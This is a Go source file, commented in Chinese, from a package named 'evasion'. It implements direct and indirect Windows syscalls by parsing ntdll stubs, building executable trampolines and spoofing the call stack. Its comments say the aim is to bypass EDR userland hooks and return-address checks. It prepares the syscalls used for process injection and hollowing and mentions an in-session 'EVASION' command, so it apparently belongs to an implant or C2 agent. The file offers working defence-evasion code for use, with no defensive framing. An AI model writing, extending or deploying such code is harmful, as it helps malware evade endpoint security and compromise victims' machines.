//go:build windows && amd64

// 直接/间接 syscall 实现（amd64）。
//
// 原理：ntdll 的 NtXxx 导出函数体开头固定为：
//   mov r10, rcx      ; 4c 8b d1
//   mov eax, SSN      ; b8 <imm32>   （syscall 号）
//   syscall           ; 0f 05
//   ret               ; c3
// 解析导出函数体即可获得 SSN 与 syscall 指令地址。EDR userland hook 会改写函数体
// 开头（jmp 到检测代码）——绕过方式：
//   - direct：把"mov eax, SSN; syscall; ret"写进可执行内存，完全不经 ntdll 函数体
//   - indirect：跳回 ntdll 内的 syscall 指令（返回地址落在 ntdll 内，
//     规避"返回地址不在 ntdll"的调用方检查；trampoline 本身不执行 syscall）
package evasion

import (
	"errors"
	"fmt"
	"syscall"
	"unsafe"

	"golang.org/x/sys/windows"
)

var (
	ntdllAddr uintptr

	// 已解析的系统调用信息（惰性初始化）
	resolved = map[string]syscallInfo{}

	// 按模式构建的 trampoline
	trampolines map[string]uintptr

	// currentMode 已装配的 syscall 模式（direct/indirect）；空表示未装配
	currentMode string
)

type syscallInfo struct {
	ssn         uintptr // syscall 号
	syscallAddr uintptr // ntdll 内 syscall 指令地址
}

// syscallNames 需要提前解析的 NtXxx 名单。
// 独立成变量是为了让测试能直接遍历它（少解析一个都可能是「静默退化」）。
var syscallNames = []string{
	"NtCreateThreadEx",
	"NtProtectVirtualMemory",
	"NtAllocateVirtualMemory",
	"NtWriteVirtualMemory",
	"NtReadVirtualMemory",
	"NtOpenProcess",
	"NtUnmapViewOfSection",
	"NtQueryInformationProcess",
}

// PrepareTrampolines 解析常用 NtXxx 的 SSN 并构建 trampoline（direct/indirect）。
func PrepareTrampolines(mode string) error {
	if mode != "direct" && mode != "indirect" {
		return fmt.Errorf("未知 syscall 模式: %s", mode)
	}
	ntdll, err := windows.LoadDLL("ntdll.dll")
	if err != nil {
		return fmt.Errorf("加载 ntdll.dll: %v", err)
	}
	ntdllAddr = uintptr(unsafe.Pointer(ntdll.Handle)) // ntdll 基址（LoadDLL 句柄=模块基址）
	trampolines = make(map[string]uintptr)

	for _, name := range syscallNames {
		info, err := resolveSyscallInfo(name)
		if err != nil {
			continue // 缺失的系统调用跳过（版本差异）
		}
		resolved[name] = info
		trampoline, err := buildTrampoline(mode, info)
		if err != nil {
			continue
		}
		trampolines[name] = trampoline
	}
	if len(trampolines) == 0 {
		return errors.New("未解析到任何系统调用信息")
	}
	currentMode = mode
	// direct 模式额外装配「伪栈」：direct 的 syscall 指令落在我们自己的页上，
	// 栈上又是 Go 运行时帧，两处都是特征；把栈换成 ntdll 帧链至少消掉一处。
	// indirect 不做（收益来自"syscall 在 ntdll 内"，枢轴会破坏它的返回路径）。
	if mode == ModeDirect {
		if err := PrepareSpoof(); err != nil {
			debug("栈伪造装配失败（回退普通 direct syscall）: %v", err)
		}
	}
	return nil
}

// resolveSyscallInfo 解析 ntdll 导出函数的 SSN 与 syscall 指令地址。
func resolveSyscallInfo(name string) (syscallInfo, error) {
	ntdll := windows.NewLazySystemDLL("ntdll.dll")
	p := ntdll.NewProc(name)
	if err := p.Find(); err != nil {
		return syscallInfo{}, fmt.Errorf("解析 %s: %v", name, err)
	}
	body := (*[64]byte)(unsafe.Pointer(p.Addr()))
	ssn, syscallAddr, err := ParseSyscallStub(body[:], p.Addr())
	if err != nil {
		return syscallInfo{}, fmt.Errorf("%s: %w", name, err)
	}
	return syscallInfo{ssn: uintptr(ssn), syscallAddr: syscallAddr}, nil
}

// buildTrampoline 分配可执行内存并写入 trampoline 机器码。
//
// 内存权限按"先写后执行"两段走：VirtualAlloc(RW) → 写码 → VirtualProtect(RX)。
// 原实现直接分配 PAGE_EXECUTE_READWRITE —— 一块 RWX 内存本身就是 EDR/扫描器
// 最醒目的特征之一，也与本项目"注入走 RW→RX"的原则自相矛盾。
func buildTrampoline(mode string, info syscallInfo) (uintptr, error) {
	code, err := BuildTrampoline(mode, uint32(info.ssn), info.syscallAddr)
	if err != nil {
		return 0, err
	}
	size := uintptr(len(code))
	// 1) 先要 RW：只写不执行
	base, err := windows.VirtualAlloc(0, size, windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
	if err != nil || base == 0 {
		return 0, fmt.Errorf("VirtualAlloc trampoline: %v", err)
	}
	dst := (*[64]byte)(unsafe.Pointer(base))
	for i, b := range code {
		dst[i] = b
	}
	// 2) 再降为 RX：执行期不可写（W^X）
	var oldProtect uint32
	if err := windows.VirtualProtect(base, size, windows.PAGE_EXECUTE_READ, &oldProtect); err != nil {
		_ = windows.VirtualFree(base, 0, windows.MEM_RELEASE)
		return 0, fmt.Errorf("VirtualProtect trampoline: %v", err)
	}
	return base, nil
}

// HasTrampoline 报告指定系统调用是否已准备好 trampoline。
//
// 调用方（注入 / 镂空）用它做"这一步能不能走 syscall"的判断：未准备就安静回退
// 宿主 API，而不是等到调用时报错。trampolines 为 nil（未启用 syscall 模式）时返回 false。
func HasTrampoline(name string) bool {
	_, ok := trampolines[name]
	return ok
}

// Syscall 通用执行（最多 8 个参数；参数按 Windows x64 调用约定由 Go runtime 放置）。
// 返回 syscall 的 NTSTATUS。
//
// direct 模式下若伪栈装配成功且 stackSpoof 开关为开，走 spoofed 路径（栈上呈现
// ntdll 帧链）；开关关、参数过多或装配失败时静默回退到普通 direct 执行，行为不变。
// 门控每次调用都重新判定，所以 EVASION 命令可以在会话内把它关掉（对已经发生的
// 调用无效，这是"栈"的物理性质：调用栈只在调用发生的那一刻存在）。
func Syscall(name string, args ...uintptr) (uintptr, error) {
	tramp, ok := trampolines[name]
	if !ok {
		return 0, fmt.Errorf("未解析的 syscall: %s", name)
	}
	n := len(args)
	if n > 8 {
		return 0, errors.New("参数过多")
	}
	if currentMode == ModeDirect && len(args) <= SpoofMaxArgs && SpoofActive() {
		if info, ok := resolved[name]; ok {
			if status, err := syscallSpoofed(uint32(info.ssn), args); err == nil {
				return status, nil
			}
		}
	}
	callArgs := make([]uintptr, 9)
	callArgs[0] = tramp
	for i, a := range args {
		callArgs[i+1] = a
	}
	status := syscallN(callArgs...)
	return status, nil
}

// syscallN 直通 runtime syscall（无 ntdll 包装，trampoline 被执行；
// 标准库 syscall.SyscallN 按 Windows x64 调用约定放置参数并 CALL trap）
func syscallN(args ...uintptr) uintptr {
	status, _, _ := syscall.SyscallN(args[0], args[1:]...)
	return status
}
